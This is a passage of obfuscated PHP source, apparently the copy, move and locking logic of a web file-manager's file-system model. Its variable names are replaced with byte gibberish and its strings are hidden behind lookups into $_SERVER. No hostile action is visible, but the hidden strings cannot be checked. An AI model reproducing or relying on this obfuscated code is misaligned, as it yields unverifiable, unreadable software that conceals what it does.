$this->_lockCheckEnd($ŒÑë¸¹Ö[586], $‡œïÆ); } public function lockCopyEnd($¤ò—Îó) { $ªã§–  =& $_SERVER[—ÌÒğš÷]; if (!$this->allowLock()) { return; } $Ãîˆàâ = 0; $this->_lockEvent($¤ò—Îó, array($ªã§– [587], $ªã§– [588]), $Ãîˆàâ); $this->_lockParent($¤ò—Îó, array($ªã§– [588]), $Ãîˆàâ); $this->_lockEvent($¤ò—Îó, array($ªã§– [589], $ªã§– [590]), $Ãîˆàâ); } public function lockWriteStart($Ğèé±Ûü, $õ€ØÔ = '') { $¬˜îÏİ² =& $_SERVER[—ÌÒğš÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($¬˜îÏİ²[587], $Ğèé±Ûü); $Ğƒ¨ÁÇÎ = 1; $this->_lockKey($¬˜îÏİ²[591] . $Ğèé±Ûü . $¬˜îÏİ²[10] . $õ€ØÔ, $Ğƒ¨ÁÇÎ); $this->_lockEvent($Ğèé±Ûü, array($¬˜îÏİ²[586], $¬˜îÏİ²[588]), $Ğƒ¨ÁÇÎ); $this->_lockParent($Ğèé±Ûü, array($¬˜îÏİ²[586], $¬˜îÏİ²[588]), $Ğƒ¨ÁÇÎ); $this->_lockCheckEnd($¬˜îÏİ²[587], $Ğèé±Ûü); } public function lockWriteEnd($Ã¬úÅ, $çÏ®Ùñí = '') { $–Ê½—ş¶ =& $_SERVER[—ÌÒğš÷]; if (!$this->allowLock()) { return; } $º¨ÔİË€ = 0; $this->_lockKey($–Ê½—ş¶[591] . $Ã¬úÅ . $–Ê½—ş¶[10] . $çÏ®Ùñí, $º¨ÔİË€); $this->_lockEvent($Ã¬úÅ, array($–Ê½—ş¶[586], $–Ê½—ş¶[588]), $º¨ÔİË€); $this->_lockParent($Ã¬úÅ, array($–Ê½—ş¶[586], $–Ê½—ş¶[588]), $º¨ÔİË€); } public function lockMoveStart($£˜Æöë) { $õÙÔî»ª =& $_SERVER[—ÌÒğš÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($õÙÔî»ª[588], $£˜Æöë); $–ã¦Êı = 1; $this->_lockKey($õÙÔî»ª[592] . $£˜Æöë, $–ã¦Êı); $this->_lockEvent($£˜Æöë, array($õÙÔî»ª[586], $õÙÔî»ª[587]), $–ã¦Êı); $this->_lockParent($£˜Æöë, array($õÙÔî»ª[586], $õÙÔî»ª[588]), $–ã¦Êı); $this->_lockEvent($£˜Æöë, array($õÙÔî»ª[593], $õÙÔî»ª[589], $õÙÔî»ª[590]), $–ã¦Êı); $this->_lockCheckEnd($õÙÔî»ª[588], $£˜Æöë); } public function lockMoveEnd($«†³¨â¡) { $«‡„‚•ò =& $_SERVER[—ÌÒğš÷]; if (!$this->allowLock()) { return; } $»¥„«¡¸ = 0; $this->_lockKey($«‡„‚•ò[592] . $«†³¨â¡, $»¥„«¡¸); $this->_lockEvent($«†³¨â¡, array($«‡„‚•ò[586], $«‡„‚•ò[587]), $»¥„«¡¸); $this->_lockParent($«†³¨â¡, array($«‡„‚•ò[586], $«‡„‚•ò[588]), $»¥„«¡¸); $this->_lockEvent($«†³¨â¡, array($«‡„‚•ò[593], $«‡„‚•ò[589], $«‡„‚•ò[590]), $»¥„«¡¸); } private function _lockCheck($æï­ŒİÃ, $öŠÄŸ€ß) { $ç¬¥î» =& $_SERVER[—ÌÒğš÷]; $ÆîÕï–Û = $this->sourceInfo($öŠÄŸ€ß); $»×¾ÓÍÍ = $æï­ŒİÃ . $ç¬¥î»[10] . $öŠÄŸ€ß; $this->_lockTimeStart[$»×¾ÓÍÍ] = timeFloat(); if (!is_array($ÆîÕï–Û)) { return; } $¸¦½Ø‹ = LNG($ç¬¥î»[594]); CacheLock::setErrorMsg($ç¬¥î»[163] . htmlspecialchars($ÆîÕï–Û[$ç¬¥î»[32]]) . $ç¬¥î»[165] . $¸¦½Ø‹); $this->_lockKey($»×¾ÓÍÍ, 1); $this->_lockKey($»×¾ÓÍÍ, 0); $Õ©ÇßËµ = array_reverse($this->parentLevelArray($ÆîÕï–Û[$ç¬¥î»[553]])); foreach ($Õ©ÇßËµ as $¥¸ÍëÈ·) { $»×¾ÓÍÍ = $æï­ŒİÃ . $ç¬¥î»[595] . $¥¸ÍëÈ·; if (CacheLock::lockGet($ç¬¥î»[596] . $»×¾ÓÍÍ)) { $ÆîÕï–Û = $this->sourceInfo($¥¸ÍëÈ·); CacheLock::setErrorMsg($ç¬¥î»[163] . htmlspecialchars($ÆîÕï–Û[$ç¬¥î»[32]]) . $ç¬¥î»[165] . $¸¦½Ø‹); $this->_lockKey($»×¾ÓÍÍ, 1); $this->_lockKey($»×¾ÓÍÍ, 0); } } } private function _lockCheckEnd($¦ĞàåÎ¦, $ã“½¯ş€) { $ñëšÍû– =& $_SERVER[—ÌÒğš÷]; $Ñ‹…ŒàÏ = $¦ĞàåÎ¦ . $ñëšÍû–[10] . $ã“½¯ş€; CacheLock::setErrorMsg($ñëšÍû–[422]); if (!isset($this->_lockTimeStart[$Ñ‹…ŒàÏ])) { return; } $ïòºãÂ³ = timeFloat() - $this->_lockTimeStart[$Ñ‹…ŒàÏ]; unset($this->_lockTimeStart[$Ñ‹…ŒàÏ]); if ($ïòºãÂ³ > 0.5) { unset(self::$cacheSourceInfo[$ñëšÍû–[501] . $ã“½¯ş€]); } $ÚÚ†şà¢ = $this->sourceInfo($ã“½¯ş€); if (!$ÚÚ†şà¢) { show_json(LNG($ñëšÍû–[105]), !1); } } private function _lockParent($ĞŠÛ‹’½, $ˆ®Ùª®¼, $ß“¾í–À) { if (!$this->autoLockSet) { return; } $öŠÌ¢üŞ = $this->sourceInfo($ĞŠÛ‹’½); if (!is_array($öŠÌ¢üŞ)) { return; } $ÛŒÇÉ™ = array_reverse($this->parentLevelArray($öŠÌ¢üŞ[$_SERVER[—ÌÒğš÷][553]])); foreach ($ÛŒÇÉ™ as $ı”¬äŸ¨) { $this->_lockEvent($ı”¬äŸ¨, $ˆ®Ùª®¼, $ß“¾í–À); } } private function _lockEvent($£€³øï, $Èä‹­í, $ÑµˆıÁ®) { $Ê©ª¬§ =& $_SERVER[—ÌÒğš÷]; if (!$this->autoLockSet) { return; } foreach ($Èä‹­í as $‡•¯ ÚÍ) { $½‹²°Ûû = $‡•¯ ÚÍ . $Ê©ª¬§[10] . $£€³øï; if ($ÑµˆıÁ® && CacheLock::lockGet($Ê©ª¬§[596] . $½‹²°Ûû)) { continue; } $this->_lockKey($½‹²°Ûû, $ÑµˆıÁ®); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Á‡¦ôÃ, $Œ—Ş¦êŞ = 1) { $‡³×Ÿ«ê = $_SERVER[—ÌÒğš÷][596] . md5($Á‡¦ôÃ); if ($Œ—Ş¦êŞ) { if (isset(self::$_lockItemArr[$‡³×Ÿ«ê])) { return; } self::$_lockItemArr[$‡³×Ÿ«ê] = 1; CacheLock::lock($‡³×Ÿ«ê, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$‡³×Ÿ«ê])) { return; } unset(self::$_lockItemArr[$‡³×Ÿ«ê]); CacheLock::unlock($‡³×Ÿ«ê); } } public function isParentOf($ª¡Šİ‡, $“ïòê„ï) { $ Òô©ĞŒ =& $_SERVER[—ÌÒğš÷]; $ñÛçÖ“ş = $this->sourceInfo($ª¡Šİ‡); $Ö¹ÀáÈÊ = $this->sourceInfo($“ïòê„ï); $€‡ÏÏÁ‹ = $ñÛçÖ“ş[$ Òô©ĞŒ[553]] . $ñÛçÖ“ş[$ Òô©ĞŒ[181]] . $ Òô©ĞŒ[50]; $Û­üÖ¢Ÿ = $Ö¹ÀáÈÊ[$ Òô©ĞŒ[553]] . $Ö¹ÀáÈÊ[$ Òô©ĞŒ[181]] . $ Òô©ĞŒ[50]; $‘§¨×¤ = strpos($Û­üÖ¢Ÿ, $€‡ÏÏÁ‹) === 0; return $‘§¨×¤; } private $targetIsDelete = 0; public function copy($ Œ±…³—, $Ÿ¤¸ùÙä, $úÑÌö´— = REPEAT_REPLACE, $Ëò‡Äï = '') { $úÊ¤ºê¤ =& $_SERVER[—ÌÒğš÷]; $áóªÇâù = $this->sourceInfo($ Œ±…³—); $×ò¨ƒ¨ = $this->sourceInfo($Ÿ¤¸ùÙä); if (!$áóªÇâù || !$×ò¨ƒ¨ || $×ò¨ƒ¨[$úÊ¤ºê¤[453]] != $úÊ¤ºê¤[88]) { return !1; } if ($this->isParentOf($ Œ±…³—, $Ÿ¤¸ùÙä)) { return !1; } $«µİ€¯â = $Ëò‡Äï ? $Ëò‡Äï : $áóªÇâù[$úÊ¤ºê¤[32]]; $this->lockCopyStart($ Œ±…³—); $this->lockWriteStart($Ÿ¤¸ùÙä, $«µİ€¯â); $ïá’âÍï = array($úÊ¤ºê¤[597] => array(), $úÊ¤ºê¤[598] => array(), $úÊ¤ºê¤[599] => array()); $this->targetIsDelete = intval($áóªÇâù[$úÊ¤ºê¤[473]]); $·º–ì°À = $this->fileNameExistAuto($Ÿ¤¸ùÙä, $áóªÇâù); $¡Óóõ = $this->_copy($ Œ±…³—, $Ÿ¤¸ùÙä, $úÑÌö´—, $ïá’âÍï, !0, $Ëò‡Äï); $this->_childrenListClear(); $this->lockCopyEnd($ Œ±…³—); $this->lockWriteEnd($Ÿ¤¸ùÙä, $«µİ€¯â); if ($áóªÇâù[$úÊ¤ºê¤[453]] == $úÊ¤ºê¤[88] && $·º–ì°À == $¡Óóõ) { $this->folderSizeResetChildren($·º–ì°À); } Model($úÊ¤ºê¤[600])->addAll($ïá’âÍï[$úÊ¤ºê¤[598]], array(), !0); if ($·º–ì°À != $¡Óóõ || $áóªÇâù[$úÊ¤ºê¤[453]] == $úÊ¤ºê¤[88]) { Model($úÊ¤ºê¤[601])->eventCopy($¡Óóõ); } $this->saveAll($ïá’âÍï[$úÊ¤ºê¤[599]]); Model($úÊ¤ºê¤[214])->linkAdd($ïá’âÍï[$úÊ¤ºê¤[597]]); $this->folderSizeReset($Ÿ¤¸ùÙä); $this->updateModifyTime($Ÿ¤¸ùÙä); return $¡Óóõ; } private function _copy($µà‡Èğö, $ê×³£À¯, $Öã­æŸÏ, &$¶ı‰ïĞ‘, $³í‘Òè¢, $È€’³›ô = '') { $Ù¹øµ¬ë =& $_SERVER[—ÌÒğš÷]; $Ò™É˜Ú = $this->sourceInfoCache($µà‡Èğö); $¦œ¥„„ = $Ò™É˜Ú[$Ù¹øµ¬ë[453]] == $Ù¹øµ¬ë[88]; $€ÎŞ†µ¹ = $È€’³›ô ? $È€’³›ô : $Ò™É˜Ú[$Ù¹øµ¬ë[32]]; $õêş = $this->fileNameExistAuto($ê×³£À¯, $Ò™É˜Ú); if ($³í‘Òè¢) { $this->_childrenAllMake($µà‡Èğö); if ($¦œ¥„„ && $õêş) { $this->_childrenAllMake($õêş); } } if (!$õêş) { return $this->_copyCreate($µà‡Èğö, $ê×³£À¯, $€ÎŞ†µ¹, $¶ı‰ïĞ‘); } $··à›£÷ = $õêş; if ($¦œ¥„„) { if ($Öã­æŸÏ == REPEAT_RENAME_FOLDER) { $€ÎŞ†µ¹ = $this->fileNameAutoCache($ê×³£À¯, $€ÎŞ†µ¹, $Öã­æŸÏ, $¦œ¥„„); $··à›£÷ = $this->_copyCreate($µà‡Èğö, $ê×³£À¯, $€ÎŞ†µ¹, $¶ı‰ïĞ‘); } else { $§è¼‰ß = $this->_childrenList($µà‡Èğö); foreach ($§è¼‰ß as $¸¶Èò†­) { $this->_copy($¸¶Èò†­[$Ù¹øµ¬ë[181]], $õêş, $Öã­æŸÏ, $¶ı‰ïĞ‘, !1); } } } else { if ($Öã­æŸÏ == REPEAT_RENAME || $Öã­æŸÏ == REPEAT_RENAME_FOLDER) { $€ÎŞ†µ¹ = $this->fileNameAutoCache($ê×³£À¯, $€ÎŞ†µ¹, $Öã­æŸÏ, $¦œ¥„„); $··à›£÷ = $this->_copyCreate($µà‡Èğö, $ê×³£À¯, $€ÎŞ†µ¹, $¶ı‰ïĞ‘); } else { if ($Öã­æŸÏ == REPEAT_REPLACE) { $ˆª“Ò¯» = $this->sourceInfoCache($õêş); $©¥à ó› = $this->fileHistory($ˆª“Ò¯», $Ò™É˜Ú[$Ù¹øµ¬ë[509]], $Ò™É˜Ú[$Ù¹øµ¬ë[76]]); if ($©¥à ó›) { $¶ı‰ïĞ‘[$Ù¹øµ¬ë[597]][] = $Ò™É˜Ú[$Ù¹øµ¬ë[509]]; } } else { if ($Öã­æŸÏ == REPEAT_SKIP) { } } } Hook::trigger($Ù¹øµ¬ë[602], array($Ù¹øµ¬ë[603], $Ò™É˜Ú, 0)); } return $··à›£÷; } private function _copyCreate($¤ÂÂË‡, $ü³ŠÔä³, $§•´¨µş, &$¢â“¯Öø) { $£Ôä°ÂÓ =& $_SERVER[—ÌÒğš÷]; $€Ş±çµ = $this->sourceInfoCache($¤ÂÂË‡); $È®éØ®Û = $this->sourceInfoCache($ü³ŠÔä³); $Éñ§üò = $this->_makeItemData($€Ş±çµ, $È®éØ®Û, $§•´¨µş); Hook::trigger($£Ôä°ÂÓ[604], $Éñ§üò); Hook::trigger($£Ôä°ÂÓ[605], array($£Ôä°ÂÓ[606], $Éñ§üò, 0)); $Ùâ°â° = $this->add($Éñ§üò); $²ªı¨Ã‘ = array($£Ôä°ÂÓ[181] => $Ùâ°â°, $£Ôä°ÂÓ[32] => $§•´¨µş); $this->_copyApplyMeta($²ªı¨Ã‘, $¢â“¯Öø); if ($€Ş±çµ[$£Ôä°ÂÓ[453]] != $£Ôä°ÂÓ[88]) { $¢â“¯Öø[$£Ôä°ÂÓ[597]][] = $€Ş±çµ[$£Ôä°ÂÓ[509]]; return $Ùâ°â°; } $Ã§šÚÚù = array(); $ùá˜ã“ = array(); $this->_childrenListAll($¤ÂÂË‡, $Ã§šÚÚù); $‰•¢âãè = count($Ã§šÚÚù); if ($‰•¢âãè == 0) { return $Ùâ°â°; } $‚ƒğºÑˆ = $this->sourceInfo($Ùâ°â°); foreach ($Ã§šÚÚù as $óØ°ƒ‹) { $‡ğƒú—ç = $this->_makeItemData($óØ°ƒ‹, $‚ƒğºÑˆ, $óØ°ƒ‹[$£Ôä°ÂÓ[32]]); $‡ğƒú—ç[$£Ôä°ÂÓ[553]] = $óØ°ƒ‹[$£Ôä°ÂÓ[553]]; $ùá˜ã“[] = $‡ğƒú—ç; } $this->chunkEventSet($£Ôä°ÂÓ[607], array($£Ôä°ÂÓ[608], $Éñ§üò, $‰•¢âãè)); $this->addAll($ùá˜ã“, array(), !1); $Ÿ²¬†Ë¨ = $this->where(array($£Ôä°ÂÓ[180] => $Ùâ°â°))->select(); $°ˆ = $this->_childrenMakeRelation($Ã§šÚÚù, $Ÿ²¬†Ë¨); $°ˆ[$¤ÂÂË‡] = $Ùâ°â°; $ÄçÑÂ¥ = array(); $âœç„à³ = array(); foreach ($Ÿ²¬†Ë¨ as $óØ°ƒ‹) { $º×§²ıû = $óØ°ƒ‹[$£Ôä°ÂÓ[181]]; $ü±ÊÊù« = $this->_childrenMatch($°ˆ, $óØ°ƒ‹, $‚ƒğºÑˆ); $ÄçÑÂ¥[] = array($£Ôä°ÂÓ[181], $º×§²ıû, $£Ôä°ÂÓ[180], $ü±ÊÊù«[$£Ôä°ÂÓ[180]]); $âœç„à³[] = array($£Ôä°ÂÓ[181], $º×§²ıû, $£Ôä°ÂÓ[553], $ü±ÊÊù«[$£Ôä°ÂÓ[553]]); $this->_copyApplyMeta($óØ°ƒ‹, $¢â“¯Öø); if ($óØ°ƒ‹[$£Ôä°ÂÓ[453]] != $£Ôä°ÂÓ[88]) { $¢â“¯Öø[$£Ôä°ÂÓ[597]][] = $óØ°ƒ‹[$£Ôä°ÂÓ[509]]; } } $this->chunkEventSet($£Ôä°ÂÓ[609], array($£Ôä°ÂÓ[610], $Éñ§üò, $‰•¢âãè)); $this->saveAll($ÄçÑÂ¥); $this->chunkEventSet($£Ôä°ÂÓ[611], array($£Ôä°ÂÓ[612], $Éñ§üò, $‰•¢âãè)); $this->saveAll($âœç„à³); return $Ùâ°â°; } private function _childrenMakeRelation($š¥è¯®Œ, $“†¨¢Ÿˆ) { $õ†Îèğ =& $_SERVER[—ÌÒğš÷]; $ÊÅ•·êÈ = array(); $ËÄÖºä´ = array(); foreach ($š¥è¯®Œ as $ä çŞé±) { $ñ°¡æ¢… = $ä çŞé±[$õ†Îèğ[32]] . $õ†Îèğ[8] . $ä çŞé±[$õ†Îèğ[553]]; $ÊÅ•·êÈ[$ñ°¡æ¢…] = $ä çŞé±[$õ†Îèğ[181]]; } foreach ($“†¨¢Ÿˆ as $ä çŞé±) { $ñ°¡æ¢… = $ä çŞé±[$õ†Îèğ[32]] . $õ†Îèğ[8] . $ä çŞé±[$õ†Îèğ[553]]; $òÎö‰Ì¨ = $ÊÅ•·êÈ[$ñ°¡æ¢…]; $ËÄÖºä´[$òÎö‰Ì¨] = $ä çŞé±[$õ†Îèğ[181]]; } return $ËÄÖºä´; } private function _childrenMatch($ÒğïĞé, $ÀÍçÇö, $›„ÚÅÕí) { $¬åâä™ =& $_SERVER[—ÌÒğš÷]; $Ä¢˜ø”… = $›„ÚÅÕí[$¬åâä™[553]]; $éÕ›˜ÉÂ = $this->parentLevelArray($ÀÍçÇö[$¬åâä™[553]]); foreach ($éÕ›˜ÉÂ as $Å¦š³—ì) { if (isset($ÒğïĞé[$Å¦š³—ì])) { $Ä¢˜ø”… .= $ÒğïĞé[$Å¦š³—ì] . $¬åâä™[613]; } } $Ä¢˜ø”… = rtrim($Ä¢˜ø”…, $¬åâä™[50]) . $¬åâä™[50]; $·¨¼¼† = $this->parentLevelArray($Ä¢˜ø”…); $ÏÛ¬ô³ş = $·¨¼¼†[count($·¨¼¼†) - 1]; return array($¬åâä™[180] => $ÏÛ¬ô³ş, $¬åâä™[553] => $Ä¢˜ø”…); } private function _makeItemData($ó¸²ŞÈ™, $üôÛçÂ«, $Á•âüİ) { $ŸÛ€™Øı =& $_SERVER[—ÌÒğš÷]; $Š¥“é = array($ŸÛ€™Øı[614] => $ó¸²ŞÈ™[$ŸÛ€™Øı[453]], $ŸÛ€™Øı[462] => $Á•âüİ, $ŸÛ€™Øı[615] => $ó¸²ŞÈ™[$ŸÛ€™Øı[454]] ? $ó¸²ŞÈ™[$ŸÛ€™Øı[454]] : $ŸÛ€™Øı[12], $ŸÛ€™Øı[510] => $ó¸²ŞÈ™[$ŸÛ€™Øı[509]] ? $ó¸²ŞÈ™[$ŸÛ€™Øı[509]] : 0, $ŸÛ€™Øı[585] => $ó¸²ŞÈ™[$ŸÛ€™Øı[76]] ? $ó¸²ŞÈ™[$ŸÛ€™Øı[76]] : 0, $ŸÛ€™Øı[616] => intval($üôÛçÂ«[$ŸÛ€™Øı[178]]), $ŸÛ€™Øı[617] => intval($üôÛçÂ«[$ŸÛ€™Øı[538]]), $ŸÛ€™Øı[618] => intval(USER_ID), $ŸÛ€™Øı[619] => intval(USER_ID), $ŸÛ€™Øı[445] => intval($üôÛçÂ«[$ŸÛ€™Øı[181]]), $ŸÛ€™Øı[620] => $üôÛçÂ«[$ŸÛ€™Øı[553]] . $üôÛçÂ«[$ŸÛ€™Øı[181]] . $ŸÛ€™Øı[50], $ŸÛ€™Øı[466] => $ó¸²ŞÈ™[$ŸÛ€™Øı[85]] ? $ó¸²ŞÈ™[$ŸÛ€™Øı[85]] : time(), $ŸÛ€™Øı[472] => 0, $ŸÛ€™Øı[621] => $ŸÛ€™Øı[12]); return $Š¥“é; } private function _copyApplyMeta($—Ú™İĞÖ, &$–ëÀÇü) { $œ¶‡ÖŞ =& $_SERVER[—ÌÒğš÷]; $Šäı¹Şè = $—Ú™İĞÖ[$œ¶‡ÖŞ[181]]; $àûÈ¨’£ = $—Ú™İĞÖ[$œ¶‡ÖŞ[32]]; if (!isset($—Ú™İĞÖ[$œ¶‡ÖŞ[622]]) || !$—Ú™İĞÖ[$œ¶‡ÖŞ[622]] || $—Ú™İĞÖ[$œ¶‡ÖŞ[622]] == $œ¶‡ÖŞ[212]) { $–ëÀÇü[$œ¶‡ÖŞ[599]][] = array($œ¶‡ÖŞ[181], $Šäı¹Şè, $œ¶‡ÖŞ[622], short_id($Šäı¹Şè)); } if (Input::check($àûÈ¨’£, $œ¶‡ÖŞ[623])) { $–ëÀÇü[$œ¶‡ÖŞ[598]][] = array($œ¶‡ÖŞ[181] => $Šäı¹Şè, $œ¶‡ÖŞ[94] => $œ¶‡ÖŞ[506], $œ¶‡ÖŞ[418] => str_replace($œ¶‡ÖŞ[53], $œ¶‡ÖŞ[12], Pinyin::get($àûÈ¨’£))); $–ëÀÇü[$œ¶‡ÖŞ[598]][] = array($œ¶‡ÖŞ[181] => $Šäı¹Şè, $œ¶‡ÖŞ[94] => $œ¶‡ÖŞ[505], $œ¶‡ÖŞ[418] => Pinyin::get($àûÈ¨’£, $œ¶‡ÖŞ[624])); } $–ëÀÇü[$œ¶‡ÖŞ[598]][] = array($œ¶‡ÖŞ[181] => $Šäı¹Şè, $œ¶‡ÖŞ[94] => $œ¶‡ÖŞ[485], $œ¶‡ÖŞ[418] => KodSort::makeStr($àûÈ¨’£)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($¨îä×ƒş) { $˜îõ˜Ş =& $_SERVER[—ÌÒğš÷]; $ãª¿–ÊÌ = $this->sourceInfo($¨îä×ƒş); $øñè¦´ = $˜îõ˜Ş[625]; $êÖ•İ‡ = array($˜îõ˜Ş[553] => array($˜îõ˜Ş[580], $ãª¿–ÊÌ[$˜îõ˜Ş[553]] . $¨îä×ƒş . $˜îõ˜Ş[581]), $˜îõ˜Ş[473] => $this->targetIsDelete); $•òÁ·ì = $this->field($øñè¦´)->where($êÖ•İ‡)->select(); if (!$•òÁ·ì) { return; } $•òÁ·ì = array_to_keyvalue($•òÁ·ì, $˜îõ˜Ş[181]); foreach ($•òÁ·ì as $´ğúªÃ‚) { $ó½÷£¥” = $´ğúªÃ‚[$˜îõ˜Ş[180]]; $¨îä×ƒş = $´ğúªÃ‚[$˜îõ˜Ş[181]]; if (!isset($this->_childrenListCache[$¨îä×ƒş]) && $´ğúªÃ‚[$˜îõ˜Ş[453]] == $˜îõ˜Ş[88]) { $this->_childrenListCache[$¨îä×ƒş] = array(); } if (!isset($this->_childrenListCache[$ó½÷£¥”])) { $this->_childrenListCache[$ó½÷£¥”] = array(); } $this->_childrenListCache[$ó½÷£¥”][$¨îä×ƒş] = $´ğúªÃ‚; $this->_childrenItemCache[$¨îä×ƒş] = $´ğúªÃ‚; } } private function _childrenListAll($¦ûÎ‰şè, &$ª‚õÓ¶¡) { $Ä‰¦âÀİ =& $_SERVER[—ÌÒğš÷]; if (!isset($this->_childrenListCache[$¦ûÎ‰şè])) { return; } $Œ‰îÉ„Ğ = $this->_childrenListCache[$¦ûÎ‰şè]; foreach ($Œ‰îÉ„Ğ as $¯üİõöÓ => $ß„¤¡) { $ª‚õÓ¶¡[$¯üİõöÓ] = $ß„¤¡; if ($ß„¤¡[$Ä‰¦âÀİ[453]] == $Ä‰¦âÀİ[88]) { $this->_childrenListAll($¯üİõöÓ, $ª‚õÓ¶¡); } } } private function sourceInfoCache($ûÃô†óÍ) { if (isset($this->_childrenItemCache[$ûÃô†óÍ])) { return $this->_childrenItemCache[$ûÃô†óÍ]; } return $this->sourceInfo($ûÃô†óÍ); } private function _childrenList($¬ö£÷«„) { if (isset($this->_childrenListCache[$¬ö£÷«„])) { return $this->_childrenListCache[$¬ö£÷«„]; } return $this->_childrenListSelect($¬ö£÷«„); } private function _childrenListSelect($÷Ø‰ÉŠğ) { $Æ±Ø«†İ =& $_SERVER[—ÌÒğš÷]; $¶‰ŸÚÑ” = array($Æ±Ø«†İ[180] => $÷Ø‰ÉŠğ, $Æ±Ø«†İ[473] => $this->targetIsDelete); $…±‹Î = $this->where($¶‰ŸÚÑ”)->select(); $…±‹Î = $…±‹Î ? $…±‹Î : array(); $æ‡Í¤æ = array_to_keyvalue($…±‹Î, $Æ±Ø«†İ[181]); $this->_childrenListCache[$÷Ø‰ÉŠğ] = $æ‡Í¤æ; foreach ($æ‡Í¤æ as $÷Ø‰ÉŠğ => $£¢¯•ú€) { $this->_childrenItemCache[$÷Ø‰ÉŠğ] = $£¢¯•ú€; } return $æ‡Í¤æ; } private function fileNameExistAuto($¬ĞÂÉÎ¸, $²Áû¼Æ) { $®‚¶™²£ =& $_SERVER[—ÌÒğš÷]; if ($²Áû¼Æ[$®‚¶™²£[473]] == $®‚¶™²£[88]) { return $this->fileNameExist($¬ĞÂÉÎ¸, $²Áû¼Æ[$®‚¶™²£[32]]); } return $this->fileNameExistCache($¬ĞÂÉÎ¸, $²Áû¼Æ[$®‚¶™²£[32]]); } private function fileNameExistCache($…ƒ½á÷İ, $öóØ‹¬) { $•²ñÔ¥Ó =& $_SERVER[—ÌÒğš÷]; $öóØ‹¬ = strtolower($öóØ‹¬); $Ï—³‹“¬ = $this->_childrenList($…ƒ½á÷İ); foreach ($Ï—³‹“¬ as $Ú˜ ÊÜ—) { if ($öóØ‹¬ == strtolower($Ú˜ ÊÜ—[$•²ñÔ¥Ó[32]])) { return $Ú˜ ÊÜ—[$•²ñÔ¥Ó[181]]; } } return !1; } private function fileNameAutoCache($«¦õ×¢Š, $õ–óÁåœ, $€®şÉâ, $åÄ–‘Õ) { $Äç´”á° =& $_SERVER[—ÌÒğš÷]; $†œè‘“¥ = $this->_childrenList($«¦õ×¢Š); $à”ÆÃ³ã = array_to_keyvalue($†œè‘“¥, $Äç´”á°[12], $Äç´”á°[32]); return $this->fileNameAutoGet($à”ÆÃ³ã, $õ–óÁåœ, $€®şÉâ, $åÄ–‘Õ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($×Ö½Ü¨ˆ, $°ıÅ•–ı, $üì¶èéâ = REPEAT_REPLACE, $À»–¸Ï = '') { $¼¦éªË =& $_SERVER[—ÌÒğš÷]; $è–£¡ = $this->sourceInfo($×Ö½Ü¨ˆ); $èøŒò  = $this->sourceInfo($°ıÅ•–ı); if ($è–£¡[$¼¦éªË[180]] == $èøŒò [$¼¦éªË[181]]) { if ($è–£¡[$¼¦éªË[473]] == $¼¦éªË[88]) { Model($¼¦éªË[471])->restore(array($×Ö½Ü¨ˆ)); } if (!$À»–¸Ï || $À»–¸Ï == $è–£¡[$¼¦éªË[32]]) { return $×Ö½Ü¨ˆ; } } $Ğ•íªÔ = $this->pathInfoMore($×Ö½Ü¨ˆ); if ($this->isParentOf($×Ö½Ü¨ˆ, $°ıÅ•–ı)) { return !1; } if (!$è–£¡ || !$èøŒò  || $èøŒò [$¼¦éªË[453]] != $¼¦éªË[88]) { return !1; } Hook::trigger($¼¦éªË[626], $Ğ•íªÔ); $this->targetIsDelete = intval($è–£¡[$¼¦éªË[473]]); if ($è–£¡[$¼¦éªË[180]] == $°ıÅ•–ı && $À»–¸Ï != $è–£¡[$¼¦éªË[32]]) { $ûğÕŞşÂ = $this->fileNameExist($°ıÅ•–ı, $À»–¸Ï); if ($ûğÕŞşÂ && $è–£¡[$¼¦éªË[453]] == $¼¦éªË[212]) { $¿¥ëÒ–™ = $this->sourceInfo($ûğÕŞşÂ); $áˆŒŸŞÙ = $this->fileHistory($¿¥ëÒ–™, $è–£¡[$¼¦éªË[509]], $è–£¡[$¼¦éªË[76]]); if (!$áˆŒŸŞÙ) { Model($¼¦éªË[512])->remove($è–£¡[$¼¦éªË[509]]); } $this->removeNow($×Ö½Ü¨ˆ, !1); $this->folderSizeReset($°ıÅ•–ı); Hook::trigger($¼¦éªË[627], $Ğ•íªÔ); return $ûğÕŞşÂ; } } $¡ŸÓôŞş = $À»–¸Ï ? $À»–¸Ï : $è–£¡[$¼¦éªË[32]]; $this->lockMoveStart($×Ö½Ü¨ˆ); $this->lockWriteStart($°ıÅ•–ı, $¡ŸÓôŞş); $£Ù±şô˜ = array($¼¦éªË[597] => array(), $¼¦éªË[628] => !1); $this->clearShare($×Ö½Ü¨ˆ, $°ıÅ•–ı); $ÙÉñÇ§ = $this->fileNameExistAuto($°ıÅ•–ı, $è–£¡); $¢‚¼ÂûÅ = $this->_move($×Ö½Ü¨ˆ, $°ıÅ•–ı, $üì¶èéâ, $£Ù±şô˜, $À»–¸Ï); $this->sourceCacheClear(); if ($è–£¡[$¼¦éªË[453]] == $¼¦éªË[88] && $ÙÉñÇ§) { $this->folderSizeResetChildren($¢‚¼ÂûÅ); } Model($¼¦éªË[214])->linkAdd($£Ù±şô˜[$¼¦éªË[597]]); if ($ÙÉñÇ§ && $£Ù±şô˜[$¼¦éªË[628]]) { $this->removeNow($×Ö½Ü¨ˆ, !1); } $this->lockMoveEnd($×Ö½Ü¨ˆ); $this->lockWriteEnd($°ıÅ•–ı, $¡ŸÓôŞş); $this->folderSizeReset($è–£¡[$¼¦éªË[180]]); $this->folderSizeReset($°ıÅ•–ı); $½õÖıÓŸ = array($è–£¡[$¼¦éªË[180]], $°ıÅ•–ı); if ($è–£¡[$¼¦éªË[453]] == $¼¦éªË[88]) { $½õÖıÓŸ[] = $×Ö½Ü¨ˆ; } $this->updateModifyTime($½õÖıÓŸ); Model($¼¦éªË[601])->eventMove($×Ö½Ü¨ˆ, $è–£¡[$¼¦éªË[180]], $°ıÅ•–ı); Hook::trigger($¼¦éªË[627], $Ğ•íªÔ); return $¢‚¼ÂûÅ; } private function _move($±§ª±‘ñ, $œá§Ä¤æ, $Ù†„Ÿõä, &$Ë°ùÍ¤, $“®İ–ù® = '') { $Õğâ“ë =& $_SERVER[—ÌÒğš÷]; $›´¤œ§× = $this->sourceInfo($±§ª±‘ñ); 